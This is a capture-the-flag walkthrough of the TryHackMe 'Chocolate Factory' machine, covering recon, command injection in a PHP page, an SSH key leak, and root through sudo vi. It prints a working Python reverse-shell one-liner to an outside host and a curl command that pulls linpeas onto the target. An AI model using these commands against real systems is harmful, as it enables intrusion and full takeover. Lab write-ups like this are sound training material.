After a long exam period, I have finally started to analyze all the TryHackMe machines again. Let me start with embedding our ip address to customized domain named `willy.thm`.

`nano /etc/hosts`

## Reconnaissance

Start with `curl` instead of browser to understand port `80` & `443` response. It is likely more efficient way compared to manual browser approach.

`curl -v willy.thm`

![[TryHackMe/Chocolate Factory/images/2.png]]

Manual ways are always great method in web applications. Instead of analyzing entire code, I can reveal (if there is something) more accurate:

![[TryHackMe/Chocolate Factory/images/3.png]]

Wappalyzer result:

![[TryHackMe/Chocolate Factory/images/4.png]]

I have tried a couple of `default user:pass` combinations ,but it did not work. We two options from that part:

- Direct Fuzzing
- Bruteforce The Panel

Since `Fuzzing` is more straightforward and achievable at first, I will shift to detect the `Endpoints` initially.

Run the command I gave you in below:

### Scan for port 80 by default

`dirsearch -u willy.thm`

![[TryHackMe/Chocolate Factory/images/5.png]]

First of all, I analyzed `/index.php.bak` with the help of the `mousepad` tool. I will show you the source code analysis step by step:

Directly move the correlated endpoint `/index.php.bak` then it automatically downloads it then rename it as `index.php`:

`mv index.php.bak index.php`

Run mousepad with `index.php`:
`mousepad index.php`

Thanks to [online compiler](https://onecompiler.com/), I successfully rendered the page:

![[TryHackMe/Chocolate Factory/images/6.png]]

As you can see here we have a command-line interface and execution button. However, `$cmd` variable directly written as it is. There is no sanitization embedded on variable.

![[TryHackMe/Chocolate Factory/images/7.png]]

Whitelisting is great approach for sanitization part. Let me show you how you can achieve:

```
<?php
if (isset($_POST['command'])) {
    $cmd = $_POST['command'];
    
    $allowed_commands = ['ls', 'pwd', 'whoami'];
    
    if (in_array($cmd, $allowed_commands)) {
        echo htmlspecialchars(shell_exec($cmd));
    } else {
        echo "Command not allowed!";
    }
}
?>
```

`htmlspecialchars() for XSS sanitization`
`$allowed_commands for limited command usage`
(optional)
only include `POST` requests:
`if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command']))`

Let's try common commands on the `command` field:

![[TryHackMe/Chocolate Factory/images/8.png]]

The command directly executed within the `onecompiler.com` ,so it prevented me to execute it because it has already sanitized on the target. Let's check other path revealed on `dirsearch` `home.php`. I encountered the same page and run `ls` command on input:

![[TryHackMe/Chocolate Factory/images/9.png]]


![[TryHackMe/Chocolate Factory/images/10.png]]

As you can see here, page rendered as I expected. Reach out other command outputs below:

`which python`:

![[TryHackMe/Chocolate Factory/images/11.png]]

`whoami`:

![[TryHackMe/Chocolate Factory/images/12.png]]

`pwd`:

![[TryHackMe/Chocolate Factory/images/13.png]]

Finally, `nmap` can be suitable for us to reach anything we did not see yet.
Basic scan will be enough to discover what we do not know so far:

`nmap -sV -sC willy.thm`

![[TryHackMe/Chocolate Factory/images/22.png]]

Machine directly tells the endpoint `key_rev_key` path and downloads the file then  reach the content of the file with `cat` command:

`cat key_rev_key`

Now there was a key leak on this file in the last lines:

![[TryHackMe/Chocolate Factory/images/23.png]]

Let's move on privilege escalation part !

## Exploitation

For the exploitation, `Web Shell` is a shortest solution for us to handle the session between `LHOST` and `RHOST`. Let me get reverse shell by injecting reverse shell payload:

Since we already knew the  occurence of `python` binary. Using `python` reverse shell is suitable ,but you can also apply `bash` reverse shell. Python shell indirectly embeds the `Bourne Shell` not `Bourne Against Shell`.

`python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`

[Resource of the reverse shell](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl)

![[TryHackMe/Chocolate Factory/images/14.png]]

I got the `reverse shell`. I examined each step in a detailed way. Do not forget to check the image that I provided you. Now let's try to enhance our shell to upgrade highly compatible `/bin/bash` + `rlwrap` to make accessible to command history.

[Upgrading Reverse Shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

`rlwrap python -c 'import pty; pty.spawn("/bin/bash")'`

![[TryHackMe/Chocolate Factory/images/15.png]]

The target does not consist of `rlwrap` binary ,so let's directly upgrade shell.

Now we can observe that we successfully upgraded our shell with the help of the command that I described above.

![[TryHackMe/Chocolate Factory/images/16.png]]

First indicator was the initial cursor. It has replaced its status with our current directory. The warning message is a default message.

Findings about OS:
`uname -a`
Linux chocolate-factory 4.15.0-115-generic #116-Ubuntu SMP Wed Aug 26 14:04:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

Reach `user` flag from `/home/charlie` default user directory.

![[TryHackMe/Chocolate Factory/images/17.png]]

Still I cannot reach `user` flag with the permissions of `www-data` webserver's permissions. However, there was a file located in `/home/charlie` called `teleport.pub` then containing a SSH keypair of the charlie. Therefore, it may suitable to try authenticate as charlie.

This is what we need to authenticate as `charlie`:


![[TryHackMe/Chocolate Factory/images/18.png]]

`ssh -i [somename] user@[IPv4]`
or
`ssh -i [somename] [IPv4]`

Now I got unprotected permission ,so give 600 permissions to target. Since we have protected file it requires lower permissions:

![[TryHackMe/Chocolate Factory/images/19.png]]

Yes ! ! !

![[TryHackMe/Chocolate Factory/images/20.png]]


At first, I was not able to read the content of `validate.php` let's also read that one

![[TryHackMe/Chocolate Factory/images/21.png]]

Done ! ! !
There was a password shown here ,so I have already discovered the open endpoint which is `home.php`. Obviously, I could not find anything on machine to make myself root. Therefore, `linpeas` may help me to escalate my privileges to root.

Steps to send `linpeas` to target:

`python -m http.server [desired port]`

On the target machine run the following:

`curl -O http://[TUN0_IP]:[LPORT]/linpeas.sh`

After that I encounter with this:

![[TryHackMe/Chocolate Factory/images/24.png]]

I captured the most important part of the `linpeas` output. Do not forget that `orange` ones indicating critical vulnerabilities.

As you can see on the `sudo -l` part, `charlie` can runÂ `vi` command with root privileges ,so let's move on `Get The Fuck Out Binaries`.

[Reach out here](https://gtfobins.github.io/#vi)

I used `vi` binary's privilege escalation vector:

![[TryHackMe/Chocolate Factory/images/25.png]]

![[TryHackMe/Chocolate Factory/images/26.png]]

Reach the `root` path to find the flag ,but there was a python file requiring us to give `base64` encoded passphrase.


![[TryHackMe/Chocolate Factory/images/27.png]]

Let me try to use:
`b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='`

![[TryHackMe/Chocolate Factory/images/28.png]]

DONE !



May The Pentest Be With You ! ! !
